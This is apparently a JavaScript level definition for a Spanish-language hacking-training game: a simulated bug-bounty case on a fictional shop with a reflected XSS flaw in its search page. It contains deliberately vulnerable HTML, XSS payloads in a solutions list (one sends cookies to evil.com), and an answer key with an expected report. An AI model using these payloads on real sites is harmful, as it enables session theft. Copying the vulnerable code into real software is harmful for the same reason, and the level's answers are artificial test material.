// ============================================================
// bb-02-xss.js — Caso Bug Bounty: XSS reflejado en búsqueda
// El jugador descubre que el campo de búsqueda no sanitiza
// el input y permite inyectar JavaScript.
// ============================================================

export default {
  id: "bb-xss-01",
  titulo: "XSS Reflejado en Búsqueda — Inyección de JavaScript",
  tipo: "xss",
  severidad: "ALTA",
  nivel: 2,
  sla: 1800,
  xp: 350,
  bounty: 750,
  briefing: [
    "Programa de bug bounty: ShopEasy (e-commerce)",
    "Scope: *.shopeasy.com",
    "Has detectado que la funcionalidad de búsqueda puede ser vulnerable.",
    "",
    "Empieza con `recon shopeasy.com` para explorar el sitio.",
    "Usa `scan <url>` para buscar vulnerabilidades.",
    "Prueba `test xss <param>` para inyectar scripts.",
    "Si funciona, `exploit xss` para demostrar el impacto.",
    "Finalmente: `report` para generar el reporte.",
    "",
    "Recuerda: XSS permite robar cookies, sesiones, y datos de usuarios.",
  ].join("\n"),

  fs: {
    // Página principal
    "/target/index.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>ShopEasy</title></head>",
      "<body>",
      "  <h1>ShopEasy - Tu tienda online</h1>",
      '  <form action="/search" method="GET">',
      '    <input name="q" placeholder="Buscar productos..." />',
      '    <button type="submit">Buscar</button>',
      "  </form>",
      '  <nav>',
      '    <a href="/products">Productos</a>',
      '    <a href="/account">Mi cuenta</a>',
      '    <a href="/cart">Carrito</a>',
      "  </nav>",
      "</body>",
      "</html>",
    ].join("\n"),

    // Resultados de búsqueda (VULNERABLE: refleja el input sin sanitizar)
    "/target/search.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>Resultados - ShopEasy</title></head>",
      "<body>",
      "  <h1>Resultados de búsqueda</h1>",
      '  <form action="/search" method="GET">',
      '    <input name="q" placeholder="Buscar productos..." />',
      '    <button type="submit">Buscar</button>',
      "  </form>",
      '  <div id="results">',
      "    <!-- EL INPUT SE REFLEJA AQUÍ SIN SANITIZAR -->",
      '    <p>Buscando: <script>document.write(new URLSearchParams(location.search).get("q") || "")</script></p>',
      "    <p>No se encontraron resultados.</p>",
      "  </div>",
      '  <script>',
      '    // Tracking de búsqueda (vulnerable a XSS)',
      '    const query = new URLSearchParams(location.search).get("q");',
      '    if (query) {',
      '      // reflected XSS aquí',
      '      document.getElementById("results").innerHTML = ',
      '        "<p>Buscando: " + query + "</p><p>No se encontraron resultados.</p>";',
      "    }",
      "  </script>",
      "</body>",
      "</html>",
    ].join("\n"),

    // Página de cuenta (tiene cookies sensibles)
    "/target/account.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>Mi Cuenta - ShopEasy</title></head>",
      "<body>",
      "  <h1>Mi Cuenta</h1>",
      "  <p>Nombre: Pedro Sánchez</p>",
      "  <p>Email: pedro@empresa.com</p>",
      "  <p>Tarjeta: Visa ****4321</p>",
      "  <p>Dirección: Calle Principal 10, Sevilla</p>",
      '  <script>',
      '    // Cookie de sesión (lo que queremos robar)',
      '    document.cookie = "session=abc123def456; path=/; HttpOnly";',
      '    document.cookie = "user_id=42; path=/";',
      "  </script>",
      "</body>",
      "</html>",
    ].join("\n"),

    // API de productos
    "/target/api/products": JSON.stringify([
      { id: 1, name: "Portátil Pro", price: 999.99, stock: 15 },
      { id: 2, name: "Ratón Inalámbrico", price: 29.99, stock: 150 },
      { id: 3, name: "Teclado Mecánico", price: 89.99, stock: 45 },
    ], null, 2),

    // Cookie de sesión del "atacante"
    "/target/attacker-collect": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>Recogiendo datos...</title></head>",
      "<body>",
      "  <h1>Datos capturados:</h1>",
      '  <pre id="stolen"></pre>',
      "  <script>",
      '    // En un ataque real, esto enviaría los datos al servidor del atacante',
      '    const params = new URLSearchParams(location.search);',
      '    const cookies = params.get("cookies");',
      '    const data = params.get("data");',
      '    if (cookies || data) {',
      '      document.getElementById("stolen").textContent = ',
      '        "Cookies robadas: " + (cookies || "ninguna") + "\\n" +',
      '        "Datos: " + (data || "ninguno");',
      "    }",
      "  </script>",
      "</body>",
      "</html>",
    ].join("\n"),
  },

  objetivos: [
    {
      tipo: "recon",
      id: "descubrir-busqueda",
      descripcion: "Descubrir la funcionalidad de búsqueda",
      puntos: 50,
    },
    {
      tipo: "test",
      id: "probar-xss-basico",
      descripcion: "Probar XSS básico en el campo de búsqueda",
      puntos: 100,
    },
    {
      tipo: "test",
      id: "probar-xss-cookie",
      descripcion: "Demostrar robo de cookies con XSS",
      puntos: 150,
    },
    {
      tipo: "exploit",
      id: "exfiltrar-sesion",
      descripcion: "Exfiltrar cookie de sesión",
      puntos: 200,
    },
    {
      tipo: "report",
      id: "generar-reporte",
      descripcion: "Generar reporte con PoC funcional",
      puntos: 100,
    },
  ],

  soluciones: {
    recon: [
      "recon shopeasy.com",
      "scan shopeasy.com",
    ],
    xss: [
      "test xss <script>alert(1)</script>",
      "test xss <img src=x onerror=alert(1)>",
      "test xss <script>document.location='http://evil.com/?c='+document.cookie</script>",
    ],
    exploit: [
      "exploit xss",
    ],
    report: [
      "report",
    ],
  },

  evidencias: {
    "busqueda-vulnerable": "/target/search.html",
    "xss-reflejado": "/target/search.html?q=<script>alert(1)</script>",
    "cookies-robadas": "/target/attacker-collect",
  },

  informeEsperado: {
    titulo: "XSS Reflejado en Búsqueda de ShopEasy",
    tipo: "Cross-Site Scripting (XSS) Reflejado",
    severidad: "ALTA",
    endpoint: "/search?q=",
    impacto: "Robo de cookies de sesión, suplantación de identidad, ejecución de código en el navegador de la víctima",
    remediacion: "Sanitizar todo input del usuario. Usar Content-Security-Policy. Codificar output con htmlspecialchars() o equivalente.",
  },

  bonusReporte: {
    conPoC: 50,
    conImpactoClaro: 50,
    conRemediacion: 50,
    conVideoCaptura: 30,
  },
};
